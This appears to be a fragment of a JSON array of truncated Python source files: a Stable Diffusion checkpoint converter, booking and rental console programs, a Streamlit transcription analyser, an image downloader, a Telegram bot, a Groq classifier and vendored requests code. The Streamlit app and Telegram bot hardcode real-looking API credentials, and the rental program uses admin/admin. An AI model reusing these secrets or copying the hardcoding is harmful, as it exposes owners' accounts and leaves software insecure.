self.use_random_input:\r\n    #                 new_batch_input = np.zeros((self.batch_size, self.num_point, batch_input_data.shape[2]))\r\n    #                 for i in range(self.batch_size):\r\n    #                     idx = point_op.n",
    "# Script for converting a HF Diffusers saved pipeline to a Stable Diffusion checkpoint.\n# *Only* converts the UNet, VAE, and Text Encoder.\n# Does not convert optimizer state or any other thing.\n\nimport argparse\nimport os.path as osp\nimport re\n\nimport torch\nfrom safetensors.torch import load_file, save_file\n\n\n# =================#\n# UNet Conversion #\n# =================#\n\nunet_conversion_map = [\n    # (stable-diffusion, HF Diffusers)\n    (\"time_embed.0.weight\", \"time_embedding.linear_1.weight\"),\n    (\"time_embed.0.bias\", \"time_embedding.linear_1.bias\"),\n    (\"time_embed.2.weight\", \"time_embedding.linear_2.weight\"),\n    (\"time_embed.2.bias\", \"time_embedding.linear_2.bias\"),\n    (\"input_blocks.0.0.weight\", \"conv_in.weight\"),\n    (\"input_blocks.0.0.bias\", \"conv_in.bias\"),\n    (\"out.0.weight\", \"conv_norm_out.weight\"),\n    (\"out.0.bias\", \"conv_norm_out.bias\"),\n    (\"out.2.weight\", \"conv_out.weight\"),\n    (\"out.2.bias\", \"conv_out.bias\"),\n]\n\nunet_conversion_map_resnet = [\n    # (stable-diffusion, HF Diffusers)\n    (\"in_layers.0\", \"norm1\"),\n    (\"in_layers.2\", \"conv1\"),\n    (\"out_layers.0\", \"norm2\"),\n    (\"out_layers.3\", \"conv2\"),\n    (\"emb_layers.1\", \"time_emb_proj\"),\n    (\"skip_connection\", \"conv_shortcut\"),\n]\n\nunet_conversion_map_layer = []\n# hardcoded number of downblocks and resnets/attentions...\n# would need smarter logic for other networks.\nfor i in range(4):\n    # loop over downblocks/upblocks\n\n    for j in range(2):\n        # loop over resnets/attentions for downblocks\n        hf_down_res_prefix = f\"down_blocks.{i}.resnets.{j}.\"\n        sd_down_res_prefix = f\"input_blocks.{3*i + j + 1}.0.\"\n        unet_conversion_map_layer.append((sd_down_res_prefix, hf_down_res_prefix))\n\n        if i < 3:\n            # no attention layers in down_blocks.3\n            hf_down_atn_prefix = f\"down_blocks.{i}.attentions.{j}.\"\n            sd_down_atn_prefix = f\"input_blocks.{3*i + j + 1}.1.\"\n            unet_conversion_map_layer.append((sd_down_atn_prefix, hf_down_atn_prefix))\n\n    for j in range(3):\n        # loop over resnets/attentions for upblocks\n        hf_up_res_prefix = f\"up_blocks.{i}.resnets.{j}.\"\n        sd_up_res_prefix = f\"output_blocks.{3*i + j}.0.\"\n        unet_conversion_map_layer.append((sd_up_res_prefix, hf_up_res_prefix))\n\n        if i > 0:\n            # no attention layers in up_blocks.0\n            hf_up_atn_prefix = f\"up_blocks.{i}.attentions.{j}.\"\n            sd_up_atn_prefix = f\"output_blocks.{3*i + j}.1.\"\n            unet_conversion_map_layer.append((sd_up_atn_prefix, hf_up_atn_prefix))\n\n    if i < 3:\n        # no downsample in down_blocks.3\n        hf_downsample_prefix = f\"down_blocks.{i}.downsamplers.0.conv.\"\n        sd_downsample_prefix = f\"input_blocks.{3*(i+1)}.0.op.\"\n        unet_conversion_map_layer.append((sd_downsample_prefix, hf_downsample_prefix))\n\n        # no upsample in up_blocks.3\n        hf_upsample_prefix = f\"up_blocks.{i}.upsamplers.0.\"\n        sd_upsample_prefix = f\"output_blocks.{3*i + 2}.{1 if i == 0 else 2}.\"\n        unet_conversion_map_layer.append((sd_upsample_prefix, hf_upsample_prefix))\n\nhf_mid_atn_prefix = \"mid_block.attentions.0.\"\nsd_mid_atn_prefix = \"middle_block.1.\"\nunet_conversion_map_layer.append((sd_mid_atn_prefix, hf_mid_atn_prefix))\n\nfor j in range(2):\n    hf_mid_res_prefix = f\"mid_block.resnets.{j}.\"\n    sd_mid_res_prefix = f\"middle_block.{2*j}.\"\n    unet_conversion_map_layer.append((sd_mid_res_prefix, hf_mid_res_prefix))\n\n\ndef convert_unet_state_dict(unet_state_dict):\n    # buyer beware: this is a *brittle* function,\n    # and correct output requires that all of these pieces interact in\n    # the exact order in which I have arranged them.\n    mapping = {k: k for k in unet_state_dict.keys()}\n    for sd_name, hf_name in unet_conversion_map:\n        mapping[hf_name] = sd_name\n    for k, v in mapping.items():\n        if \"resnets\" in k:\n            for sd_part, hf_part in unet_conversion_map_resnet:\n                v = v.replace(hf_part, sd_part)\n            mapping[k] = v\n    for k, v in mapping.items():\n        for sd_part, hf_part in unet_conversion_map_layer:\n            v = v.replace(hf_part, sd_part)\n        mapping[k] = v\n    new_state_dict = {v: unet_state_dict[k] for k, v in mapping.items()}\n    return new_state_dict\n\n\n# ================#\n# VAE Conversion #\n# ================#\n\nvae_conversion_map = [\n    # (stable-diffusion, HF Diffusers)\n    (\"nin_shortcut\", \"conv_shortcut\"),\n    (\"norm_out\", \"conv_norm_out\"),\n    (\"mid.attn_1.\", \"mid_block.attentions.0.\"),\n]\n\nfor i in range(4):\n    # down_blocks have two resnets\n    for j in range(2):\n        hf_down_prefix = f\"encoder.down_blocks.{i}.resnets.{j}.\"\n        sd_down_prefix = f\"encoder.down.{i}.block.{j}.\"\n        vae_conversion_map.append((sd_down_prefix, hf_down_prefix))\n\n    if i < 3:\n        hf_downsample_prefix = f\"down_blocks.{i}.downsamplers.0.\"\n        sd_downsample_prefix = f\"down.{i}.downsample.\"\n        vae_conversion_map.append((sd_downsample_prefix, hf_downsample_prefix))\n\n        hf_upsample_prefix = ",
    "game_library = {\r\n    \"Donkey Kong\" : {\"quantity\": 3, \"cost\": 2},\r\n    \"Super Mario Bros\" : {\"quantity\": 5, \"cost\":3},\r\n    \"Tetris\" : {\"quantity\" : 2, \"cost\" : 1}\r\n}\r\nuser_account = {}\r\n\r\nadmin_password = \"admin\"\r\nadmin_username = \"admin\"\r\n\r\ndef sign_up():\r\n    print(\"\\n---Sign Up---\")\r\n    while True:\r\n        try:\r\n            username = input(\"Enter your usename: \")\r\n            if username in user_account:\r\n                print(\"Username taken. Try again.\")\r\n                sign_up()\r\n            if not username:\r\n                main()\r\n            if username not in user_account:\r\n                points = 0\r\n                balance = 0\r\n                password = input(\"Enter your password: \")\r\n\r\n                if len(password) < 8:\r\n                    print(\"Password must be at least 8 Characters. Try Again\")\r\n                    continue\r\n                else:\r\n                    user_account[username] = {\"password\" : password, \"points\" : points, \"balance\" : balance}\r\n                    print(\"Sign Up Successful\")\r\n                    main()\r\n            else:\r\n                print(\"Invalid Input\")\r\n                sign_up()\r\n        except ValueError as e:\r\n            main()\r\n\r\ndef sign_in():\r\n    print(\"\\n---Sign In---\")\r\n    while True:\r\n        try:\r\n            username = input(\"Enter your Username: \")\r\n            password = input(\"Enter your password: \")\r\n\r\n            if not username:\r\n                main()\r\n            if username in user_account:\r\n                if user_account[username] and user_account[username]['password'] == password:\r\n                    print(\"Log In Successful\")\r\n                    usermenu(username)\r\n                else:\r\n                    print(\"Invalid Pasword\")\r\n            else:\r\n                print(\"Invalid Username\")\r\n        except ValueError as e:\r\n            main()\r\n\r\ndef usermenu(username):\r\n    print(f\"Welcome to Game Rental {username}\")\r\n    while True:\r\n        try:\r\n            print(\"1. Rent Game\")\r\n            print(\"2. Return Game\")\r\n            print(\"3. Top Up\")\r\n            print(\"4, Display Inventory\")\r\n            print(\"5. Redeem Free Game Rental\")\r\n            print(\"6. Check Points\")\r\n            print(\"7. Log Out\")\r\n\r\n            choice = int(input(\"Enter Choice: \"))\r\n\r\n            if choice == 1:\r\n                rent_game(username)\r\n            if choice == 2:\r\n                return_game(username)\r\n            if choice == 3:\r\n                top_up(username)\r\n            if choice == 4:\r\n                display_available_games()\r\n            if choice == 5:\r\n                redeem_free_game(username)\r\n            if choice == 6:\r\n                checkpoints(username)\r\n            if choice == 7:\r\n                main()\r\n            else: \r\n                print(\"Invalid Input\")\r\n\r\n        except ValueError as e:\r\n            usermenu(username)\r\n\r\ndef rent_game(username):\r\n    print(\"---Rent a Game---\")\r\n    while True:\r\n        try:\r\n            game_choice = input(\"Enter your game choice: \")\r\n\r\n            if game_choice not in game_library:\r\n                usermenu(username)\r\n            if game_choice in game_library:\r\n                game_quantity = int(input(\"Enter the quantity of games you want to rent: \"))\r\n                if game_quantity > game_library[game_choice]['quantity']:\r\n                    print(\"Not enough game quantity. Try Again\")\r\n                    rent_game(username)\r\n                else:\r\n                    \r\n                    if user_account[username]['balance'] < game_library[game_choice]['cost']:\r\n                        print(\"Not Enough Balance Top Up first. \")\r\n                        usermenu(username)\r\n                    else:\r\n                        game_library[game_choice]['quantity'] -= game_quantity\r\n                        user_account[username]['balance'] -= game_library[game_choice]['cost']\r\n\r\n                        user_account[username]['points'] += (game_library[game_choice]['cost'] // 2) \r\n\r\n                        print(\"Game Successfully Rented. Thank You\")\r\n\r\n                        print(f\"New User Balance: {user_account[username]['balance']}\\n\\nNew User Points: {user_account[username]['points']}\")\r\n\r\n                        usermenu(username)\r\n        except ValueError as e:\r\n            usermenu(username)\r\n\r\ndef return_game(username):\r\n    print(\"---Return A Game---\")\r\n    while True:\r\n        try:\r\n            game_name = input(\"Name of the game you want to return: \")\r\n            if not game_name:\r\n                usermenu(username)\r\n            if game_name in game_library:\r\n                game_quantity = int(input(\"Enter the quantity of games you want to return: \"))\r\n\r\n                game_library[game_name]['quantity'] += game_quantity\r\n\r\n                print(\"You successfully returned the game\")\r\n\r\n                usermenu(username)\r\n            else:\r\n                print(\"Invalid Input\")\r\n                return_game(username)\r\n        except ValueEr",
    "import streamlit as st\r\nimport zipfile\r\nimport assemblyai as ai\r\nfrom textblob import TextBlob\r\n\r\n# Function to extract MP3 files from a zip file\r\ndef extract_mp3_from_zip(zip_file):\r\n    extracted_files = []\r\n    with zipfile.ZipFile(zip_file, 'r') as zip_ref:\r\n        file_list = zip_ref.namelist()\r\n        mp3_files = [file for file in file_list if file.endswith('.mp3')]\r\n        # Extracting the MP3 files\r\n        for mp3_file in mp3_files:\r\n            zip_ref.extract(mp3_file)\r\n            extracted_files.append(mp3_file)\r\n    return extracted_files\r\n\r\n# Function to transcribe the audio file \r\ndef transcribe_audio(audio_file, api_key):\r\n    ai.settings.api_key = api_key\r\n    transcriber = ai.Transcriber()\r\n\r\n    try:\r\n        transcript = transcriber.transcribe(audio_file)\r\n        return transcript.text\r\n    except Exception as e:\r\n        st.error(f\"Transcription failed: {e}\")\r\n        return None\r\n\r\n# Function to analyze sentiment\r\ndef analyze_sentiment(text):\r\n    blob = TextBlob(text)\r\n    polarity = blob.sentiment.polarity\r\n    \r\n    if polarity > 0:\r\n        return \"Positive\"\r\n    elif polarity < 0:\r\n        return \"Negative\"\r\n    else:\r\n        return \"Neutral\"\r\n    \r\n# Function to calculate error rate\r\ndef error_rate_calculation(text):\r\n    keywords = [\"fault\", \"mistake\", \"problem\", \"incorrect\", \"issue\", \"apology\", \"sorry\"]\r\n    errors = sum(text.lower().count(keyword) for keyword in keywords)\r\n    total_words = len(text.split())\r\n    return ((errors/total_words)*100)\r\n\r\n# Function to calculate resolution rate\r\ndef resolution_rate_calculation(text):\r\n    keywords = [\"resolved\", \"satisfied\", \"problem solved\", \"resolving\"]\r\n    issue_resolved = any(keyword in text.lower() for keyword in keywords)\r\n    resolution_rate = 1 if issue_resolved else 0\r\n    return resolution_rate\r\n\r\n#Function to calculate abandonment rate\r\ndef abandonment_rate_calculation(text):\r\n    keywords = [\"disconnected\", \"hung up\"]\r\n    abandoned_calls = sum(text.lower().count(keyword) for keyword in keywords)\r\n    return abandoned_calls\r\n\r\n# Function to read text from file\r\ndef read_text_from_file(file_path):\r\n    with open(file_path, 'r') as file:\r\n        text = file.read()\r\n    return text\r\n\r\ndef main():\r\n    st.title(\"Quality Management System\")\r\n    st.write(\"Please upload a zip file containing MP3 files.\")\r\n\r\n    zip_file = st.file_uploader(\"Upload Zip File\", type=['zip'])\r\n    \r\n    if zip_file is not None:\r\n        # Extract MP3 files from the uploaded zip file\r\n        extracted_files = extract_mp3_from_zip(zip_file)\r\n\r\n        api_key = \"2ff0709983594e23823ce6cc5683cf11\"\r\n\r\n        if extracted_files:\r\n            st.write(\"MP3 files extracted successfully:\")\r\n            for file in extracted_files:\r\n                st.write(file)\r\n\r\n            # Transcriptions and Sentiment Analysis\r\n            st.write(\"Quality Analysis:\")\r\n            for mp3_file in extracted_files:\r\n                # Transcribe each MP3 file\r\n                transcription = transcribe_audio(mp3_file, api_key)\r\n                if transcription:\r\n                    st.write(f\"{mp3_file}: {transcription}\")\r\n                    \r\n                    # Write transcribed text to a text file\r\n                    text_file_path = f\"{mp3_file}.txt\"\r\n                    with open(text_file_path, 'w') as text_file:\r\n                        text_file.write(transcription)\r\n                        \r\n                    sentiment = analyze_sentiment(transcription)\r\n                    st.write(f\"Sentiment for {mp3_file}: {sentiment}\")\r\n                    \r\n                    error_rate = error_rate_calculation(transcription)\r\n                    st.write(f\"Error Rate for {mp3_file}: {error_rate}\")\r\n                    \r\n                    resolution_rate = resolution_rate_calculation(transcription)\r\n                    st.write(f\"Resolution Rate for {mp3_file}: {resolution_rate}\")\r\n                    \r\n                    abandonment_rate = abandonment_rate_calculation(transcription)\r\n                    st.write(f\"Abandonment Rate for {mp3_file}: {abandonment_rate}\")\r\n                \r\n                else:\r\n                    st.write(f\"{mp3_file}: Transcription failed\")\r\n    \r\nif __name__ == \"__main__\":\r\n    main()\r\n",
    "import os\nimport requests\nfrom PIL import Image\nfrom io import BytesIO\nfrom datetime import datetime\nimport argparse\nimport hashlib\nimport json\n\n\n\n\n# Enter your API key and endpoint URL here\nAPI_KEY = \"Paste Your Api Key Here\"\nURL = \"https://api.bing.microsoft.com/v7.0/images/search\"\n\n\n\n# Define the search query\narg = argparse.ArgumentParser()\narg.add_argument(\"-q\", \"--query\", required=True,\n                help=\"Enter the search query for the Bing Image Search API\")\narg.add_argument(\"-c\", \"--count\", type=int, default=50 ,help=\"Enter the number of images to download default is 50\")\narg.add_argument(\"-d\", \"--directory\", default='./images' ,help=\"Enter the directory to save the images\")\narg.add_argument(\"-l\", \"--license\", default=\"public\", help=\"Enter the license type for the images(All/Any/Public(DEFAULT)/Share/ShareComercially/Modify/ModifyComercially)\")\narg.add_argument(\"-o\", \"--offset\", default=0, help=\"Enter the offset to start the search from\")\narg.add_argument(\"-m\",\"--market\", default=\"en-US\", help=\"Enter the market to search from(https://learn.microsoft.com/en-us/bing/search-apis/bing-image-search/reference/market-codes)\")\narg.add_argument(\"-ss\", \"--safe_search\", default=\"Off\", help=\"Enter the safe search level to use(Off/Moderate/Strict) \")\narg.add_argument(\"-s\", \"--size\", default=\"All\", help=\"Enter the size of the image to search for(Small/Medium/Large/All/Wallpaper)\")\narg.add_argument(\"-a\", \"--aspect\", default=\"All\", help=\"Enter the aspect ratio of the image to search for(Squre/Wide/Tall/All) \")\narg.add_argument(\"-cl\", \"--color\", default =\"ColorOnly\", help=\"Enter the color of the image to search for(ColorOnly/MonoChrome/Enter any dominant color) \")\nargs = vars(arg.parse_args())\n\n\n# Get the arguments from the command line\nquery = args['query']\ncount = args['count']\nfinal_directory = args['directory']\nlicense = args['license']\noffset = args['offset']\nmarket = args['market']\nsafe_search = args['safe_search']\nsize = args['size']\naspect = args['aspect']\ncolor = args['color']\n\n\n# Creating a request to send to the API\nheaders = {\"Ocp-Apim-Subscription-Key\" : API_KEY}\nparams  = {\"q\": query, \"count\": count, \"license\": license, \"imageType\": \"photo\", offset: offset, \"market\": market, \"safeSearch\": safe_search, \"size\": size, \"aspect\": aspect, \"color\": color}\nresponse = requests.get(URL, headers=headers, params=params)\nresponse.raise_for_status()\nsearch_results = response.json()\nimage_urls = [img['contentUrl'] for img in search_results[\"value\"]]\n\n\n\n# Load the image hashes from a file to avoid duplicates\ntry:\n    with open('image_hashes.json', 'r') as f:\n        image_hashes = set(json.load(f))\nexcept FileNotFoundError:\n    image_hashes = set()\n\n\n\n# Download the images and save them to the specified directory\nfor i, url in enumerate(image_urls):\n    try:\n        image_data = requests.get(url)\n        image_data.raise_for_status()\n        image = Image.open(BytesIO(image_data.content))\n        if image.mode == 'RGBA':\n            image = image.convert('RGB')\n            print(\"Converted RGBA image to RGB\")\n\n\n        # Calculate the hash of the image\n        image_hash = hashlib.md5(image.tobytes()).hexdigest()\n        if image_hash in image_hashes:\n            print(\"Skipping duplicate image\")\n            continue\n        image_hashes.add(image_hash)\n\n\n        # Save the image to the specified directory default is images\n        if not os.path.exists(final_directory):\n            os.makedirs(final_directory)\n        file_path = os.path.join(final_directory, f'{query}_{datetime.now().strftime('%Y%m%d%H%M%S')}{i}.jpg')\n        with open(file_path, 'wb') as f:\n            image.save(f, \"JPEG\")\n        print(f\"Downloaded {url} - saved to {file_path}\")\n    except Exception as e:\n        print(f\"Could not download {url} - {e}\")\n\n\n\n# Save the image hashes to a file to avoid duplicates in future\nwith open('image_hashes.json', 'w') as f:\n    json.dump(list(image_hashes), f)      ",
    "from aiogram import Bot,Dispatcher,types,F\nimport asyncio\nfrom aiogram.filters import Command\nfrom anaylise import has_cyrillic\nfrom baza import to_cyrillic,to_latin\nfrom read_word import word_reader\ntokenAPI='6960765694:AAFvV8bhNpELWoWAkxeO4QaKn8ZFnm1x9XY'\nbot=Bot(token=tokenAPI,parse_mode='HTML')\ndp=Dispatcher()\n\n@dp.message(Command('start'))\nasync def start(message:types.Message):\n    await message.answer('Welcome')\n\n@dp.message(F.text)\nasync def get_photo(message:types.Message):\n    txt=message.text\n    if has_cyrillic(text=txt):\n        await message.answer(to_latin(txt))\n    else:\n        await message.answer(to_cyrillic(txt))\n@dp.message(F.document)\nasync def get_doc(message:types.Message):\n    doc=message.document\n    file_id=doc.file_id\n    file_name=str(doc.file_name)\n    document_type=file_name[file_name.rindex('.')+1:]\n    if document_type=='docx':\n        file=await bot.get_file(file_id=file_id)\n        custom_file=f'{doc.file_unique_id}.docx'\n        await bot.download(file=file,destination=custom_file)\n        data=await message.answer('Fayl yuklandi')\n        green='\ud83d\udfe9'\n        white='\u2b1c\ufe0f'\n        for i in range(1,11):\n            percent=i*10\n            await data.edit_text(f'Fayl jarayonda... \\n'\\\n                                 f'{i*green}{(10-i)*white}\\n'\\\n                                 f'Downloading {percent}% 100')\n        await data.delete()\n        word_reader(custom_file)\n        new_doc=types.input_file.FSInputFile(path=custom_file,filename=file_name)\n        await message.answer_document(document=new_doc,caption='Converted document')\n        try:\n            import os\n            if os.path.isfile(custom_file):\n                os.remove(custom_file)\n        except:\n            pass\n\nasync def main():\n    await dp.start_polling(bot)\n\nif __name__=='__main__':\n    asyncio.run(main())\n",
    "\"\"\"\nrequests.adapters\n~~~~~~~~~~~~~~~~~\n\nThis module contains the transport adapters that Requests uses to define\nand maintain connections.\n\"\"\"\n\nimport os.path\nimport socket  # noqa: F401\n\nfrom pip._vendor.urllib3.exceptions import ClosedPoolError, ConnectTimeoutError\nfrom pip._vendor.urllib3.exceptions import HTTPError as _HTTPError\nfrom pip._vendor.urllib3.exceptions import InvalidHeader as _InvalidHeader\nfrom pip._vendor.urllib3.exceptions import (\n    LocationValueError,\n    MaxRetryError,\n    NewConnectionError,\n    ProtocolError,\n)\nfrom pip._vendor.urllib3.exceptions import ProxyError as _ProxyError\nfrom pip._vendor.urllib3.exceptions import ReadTimeoutError, ResponseError\nfrom pip._vendor.urllib3.exceptions import SSLError as _SSLError\nfrom pip._vendor.urllib3.poolmanager import PoolManager, proxy_from_url\nfrom pip._vendor.urllib3.util import Timeout as TimeoutSauce\nfrom pip._vendor.urllib3.util import parse_url\nfrom pip._vendor.urllib3.util.retry import Retry\n\nfrom .auth import _basic_auth_str\nfrom .compat import basestring, urlparse\nfrom .cookies import extract_cookies_to_jar\nfrom .exceptions import (\n    ConnectionError,\n    ConnectTimeout,\n    InvalidHeader,\n    InvalidProxyURL,\n    InvalidSchema,\n    InvalidURL,\n    ProxyError,\n    ReadTimeout,\n    RetryError,\n    SSLError,\n)\nfrom .models import Response\nfrom .structures import CaseInsensitiveDict\nfrom .utils import (\n    DEFAULT_CA_BUNDLE_PATH,\n    extract_zipped_paths,\n    get_auth_from_url,\n    get_encoding_from_headers,\n    prepend_scheme_if_needed,\n    select_proxy,\n    urldefragauth,\n)\n\ntry:\n    from pip._vendor.urllib3.contrib.socks import SOCKSProxyManager\nexcept ImportError:\n\n    def SOCKSProxyManager(*args, **kwargs):\n        raise InvalidSchema(\"Missing dependencies for SOCKS support.\")\n\n\nDEFAULT_POOLBLOCK = False\nDEFAULT_POOLSIZE = 10\nDEFAULT_RETRIES = 0\nDEFAULT_POOL_TIMEOUT = None\n\n\nclass BaseAdapter:\n    \"\"\"The Base Transport Adapter\"\"\"\n\n    def __init__(self):\n        super().__init__()\n\n    def send(\n        self, request, stream=False, timeout=None, verify=True, cert=None, proxies=None\n    ):\n        \"\"\"Sends PreparedRequest object. Returns Response object.\n\n        :param request: The :class:`PreparedRequest <PreparedRequest>` being sent.\n        :param stream: (optional) Whether to stream the request content.\n        :param timeout: (optional) How long to wait for the server to send\n            data before giving up, as a float, or a :ref:`(connect timeout,\n            read timeout) <timeouts>` tuple.\n        :type timeout: float or tuple\n        :param verify: (optional) Either a boolean, in which case it controls whether we verify\n            the server's TLS certificate, or a string, in which case it must be a path\n            to a CA bundle to use\n        :param cert: (optional) Any user-provided SSL certificate to be trusted.\n        :param proxies: (optional) The proxies dictionary to apply to the request.\n        \"\"\"\n        raise NotImplementedError\n\n    def close(self):\n        \"\"\"Cleans up adapter specific items.\"\"\"\n        raise NotImplementedError\n\n\nclass HTTPAdapter(BaseAdapter):\n    \"\"\"The built-in HTTP Adapter for urllib3.\n\n    Provides a general-case interface for Requests sessions to contact HTTP and\n    HTTPS urls by implementing the Transport Adapter interface. This class will\n    usually be created by the :class:`Session <Session>` class under the\n    covers.\n\n    :param pool_connections: The number of urllib3 connection pools to cache.\n    :param pool_maxsize: The maximum number of connections to save in the pool.\n    :param max_retries: The maximum number of retries each connection\n        should attempt. Note, this applies only to failed DNS lookups, socket\n        connections and connection timeouts, never to requests where data has\n        made it to the server. By default, Requests does not retry failed\n        connections. If you need granular control over the conditions under\n        which we retry a request, import urllib3's ``Retry`` class and pass\n        that instead.\n    :param pool_block: Whether the connection pool should block for connections.\n\n    Usage::\n\n      >>> import requests\n      >>> s = requests.Session()\n      >>> a = requests.adapters.HTTPAdapter(max_retries=3)\n      >>> s.mount('http://', a)\n    \"\"\"\n\n    __attrs__ = [\n        \"max_retries\",\n        \"config\",\n        \"_pool_connections\",\n        \"_pool_maxsize\",\n        \"_pool_block\",\n    ]\n\n    def __init__(\n        self,\n        pool_connections=DEFAULT_POOLSIZE,\n        pool_maxsize=DEFAULT_POOLSIZE,\n        max_retries=DEFAULT_RETRIES,\n        pool_block=DEFAULT_POOLBLOCK,\n    ):\n        if max_retries == DEFAULT_RETRIES:\n            self.max_retries = Retry(0, read=False)\n        else:\n            self.max_retries = Retry.from_int(max_retries)\n        self.config = {}\n        self.proxy_manager = {}\n\n        super().__init__()\n\n        self._pool_connections = pool_connections\n        self._pool_maxsize = pool_maxsize\n      ",
    "import json\nimport os\n\nimport pandas\nimport streamlit as st\nfrom groq import Groq\n\nif not os.environ.get(\"GROQ_API_KEY\"):\n    st.error(\n        \"Please set the GROQ_API_KEY environment variable in order to categorize entries.\"\n    )\n    st.stop()\n\nclient = Groq(api_key=os.environ.get(\"GROQ_API_KEY\"))\nmodel = \"llama2-70b-4096\"\n\n\n@st.cache_data\ndef get_topic_classes(unique_topics: list[str], num_classes: int) -> list[str]:\n    \"\"\"Generate classes based on a list of unique topics.\"\"\"\n\n    chat_classes = client.chat.completions.create(\n        messages=[\n            {\n                \"role\": \"system\",\n                \"content\": \"\"\"\n                    You are a highly accurate and context-aware classifier of timetracking entries.\n                    Given a list of of labels assigned to timetracking entries by the user,\n                    you generate the specified number of classes that best represent the topics the user worked on.\n                    Only output the classname (do not e.g. include details in brackets).\n                    You output the classes in JSON, following this pattern:\n                    { \"classes\": [\"Topic Class 1\", \"Topic Class 2\", ...] }\n                \"\"\",\n            },\n            {\n                \"role\": \"user\",\n                \"content\": f\"\"\"\n                    Generate {num_classes} classes based on these topics I worked on:\n                    {'\\n '.join(unique_topics)}\n                \"\"\",\n            },\n        ],\n        model=model,\n        response_format={\"type\": \"json_object\"},\n        temperature=0.0,\n    )\n\n    result_classes = json.loads(chat_classes.choices[0].message.content)\n    return result_classes[\"classes\"]\n\n\n@st.cache_data\ndef get_topic_class_mapping(\n    classes: list[str], entries: pandas.DataFrame\n) -> dict[int, str]:\n    \"\"\"Generate a mapping of topics to classes based on a list of classes and timetracking entries.\"\"\"\n\n    labels = entries[\"notes\"].fillna(\"other\").unique()\n\n    # Make sure the model includes the original label in its output to improve class prediction:\n    chat_mapping = client.chat.completions.create(\n        messages=[\n            {\n                \"role\": \"system\",\n                \"content\": \"\"\"\n                    You are a highly accurate and context-aware classifier of timetracking entries.\n                    Given a list of timetracking labels of the user, and a list of classes,\n                    you assign each label to the class that best represents the topic the label is about.\n                    You must only use the classes provided by the user. If a label does not fit any class,\n                    choose a class that is the closest match. \n                    You output the mapping in JSON, following this pattern:\n                    {\n                        \"label 1\": \"topic class 3\",\n                        \"label 2\": \"topic class 3\",\n                        \"label 2\": \"topic class 1\",\n                        ...\n                    }\n                \"\"\",\n            },\n            {\n                \"role\": \"user\",\n                \"content\": f\"\"\"\n                    Here are the classes to be used:\n                    {'\\n '.join(classes)}\n\n                    Here are the labels to be classified:\n                    {'\\n '.join(labels)}\n                \"\"\",\n            },\n        ],\n        model=model,\n        response_format={\"type\": \"json_object\"},\n        temperature=0.0,\n    )\n\n    return json.loads(chat_mapping.choices[0].message.content)\n",
    "voos = {\n    \"AS7012\": [2, 3, 5],\n    \"QX2002\": [2, 3, 5],\n    \"AS2002\": [2, 3, 5],\n    \"8E880\": [2, 3, 5],\n    \"8E890\": [2, 3, 5]\n}\n\n\n\ndef main():\n        valor1, valor2, valor3, valor4, valor5 = 0, 0, 0, 0, 0\n        while True:\n            print(\"Voos dispon\u00edveis: AS7012, QX2002, AS2002, 8E880, 8E890\")\n            voo = input(\"Qual voo a ser consultado: \")\n\n            if voo == \"AS7012\":\n                valor1 += sis(voos[\"AS7012\"][0], voos[\"AS7012\"][1], voos[\"AS7012\"][2], \"AS7012\")\n\n            elif voo == \"QX2002\":\n                valor2 += sis(voos[\"QX2002\"][0], voos[\"QX2002\"][1], voos[\"QX2002\"][2], \"QX2002\")\n\n            elif voo == \"AS2002\":\n                valor3 += sis(voos[\"AS2002\"][0], voos[\"AS2002\"][1], voos[\"AS2002\"][2], \"AS2002\")\n\n            elif voo == \"8E880\":\n                valor4 += sis(voos[\"8E880\"][0], voos[\"8E880\"][1], voos[\"8E880\"][2], \"8E880\")\n\n            elif voo == \"8E890\":\n                valor5 += sis(voos[\"8E890\"][0], voos[\"8E890\"][1], voos[\"8E890\"][2], \"8E890\")\n\n            perg = input(\"Deseja continuar a compra: \")\n            if perg == \"Sim\":\n                continue\n            elif perg == \"N\u00e3o\":\n                break\n\n        valorf = valor1 + valor2 + valor3 + valor4 + valor5\n        print(f\"O valor total da sua compra foi de ${valorf:.2f}\")\n\n\n\ndef sis(a, b, c, d):\n    print(f\"Este voo possui {a} passagens de executiva, {b} passagens confort e {c} passagens econ\u00f4micas\")\n    opt = input(\"Qual op\u00e7\u00e3o de passagem voc\u00ea deseja: \")\n\n    if opt == \"1\":\n        quant, voos[d][0] = quantidade(voos[d][0])\n        valor1 = quant * 500\n        return valor1\n    elif opt == \"2\":\n        quant, voos[d][1] = quantidade(voos[d][1])\n        valor2 = quant * 350\n        return valor2\n    elif opt == \"3\":\n        quant, voos[d][2] = quantidade(voos[d][2])\n        valor3 = quant * 100\n        return valor3\n\n\n\ndef quantidade(z):\n    quant = int(input(\"Quantidade de passagens: \"))\n    if quant > z:\n        print(\"Quantidade de passagens indispon\u00edveis\")\n    else:\n        z -= quant\n    return quant, z\n\n\n\nmain()",
    "import random\nimport string\nfrom seats import SeatBookingSystem\n\n\n# Global set to keep track of all issued booking references\nissued_references = set()\n\ndef generate_unique_booking_reference():\n    \"\"\"\n    Generates a unique booking reference consisting of exactly eight alphanumeric characters.\n    Ensures the generated reference is unique by checking against previously issued references.\n    \n    :return: A unique booking reference string\n    \"\"\"\n    while True:\n        # Generate a random string of 8 alphanumeric characters\n        reference = ''.join(random.choices(string.ascii_letters + string.digits, k=8))\n        # Check if the generated reference is unique\n        if reference not in issued_references:\n            issued_references.add(reference)\n            return reference\n\n\n\ndef main():\n    \"\"\"\n    Main function to run the seat booking application.\n    It displays a menu and processes user input.\n    \"\"\"\n    system = SeatBookingSystem()\n    while True:\n        print(\"\\n--- Apache Airlines Seat Booking System ---\")\n        print(\"1. Check availability of seat\")\n        print(\"2. Book a seat\")\n        print(\"3. Free a seat\")\n        print(\"4. Show booking state\")\n        print(\"5. Show booking details\")\n        print(\"6. Exit program\")\n        choice = input(\"Enter your choice: \")\n        \n        # Process user input based on the choice\n        if choice == '1':\n            seat = input(\"Enter seat number (e.g., '1A'): \")\n            system.check_availability(seat)\n        elif choice == '2':\n            seat = input(\"Enter seat number to book (e.g., '1A'): \")\n            passport_number = input(\"Enter passport number: \")\n            first_name = input(\"Enter first name: \")\n            last_name = input(\"Enter last name: \")\n            reference = generate_unique_booking_reference()\n            system.book_seat(seat, reference, passport_number, first_name, last_name)\n        elif choice == '3':\n            seat = input(\"Enter seat number to free (e.g., '1A'): \")\n            system.free_seat(seat)\n        elif choice == '4':\n            system.show_booking_state()\n        elif choice == '5':\n            ref = input(\"Enter booking reference to view details: \")\n            if ref in system.booking_details:\n                details = system.booking_details[ref]\n                print(f\"Details for booking {ref}:\")\n                print(f\"Passport Number: {details['passport_number']}\")\n                print(f\"Name: {details['first_name']} {details['last_name']}\")\n                print(f\"Seat: 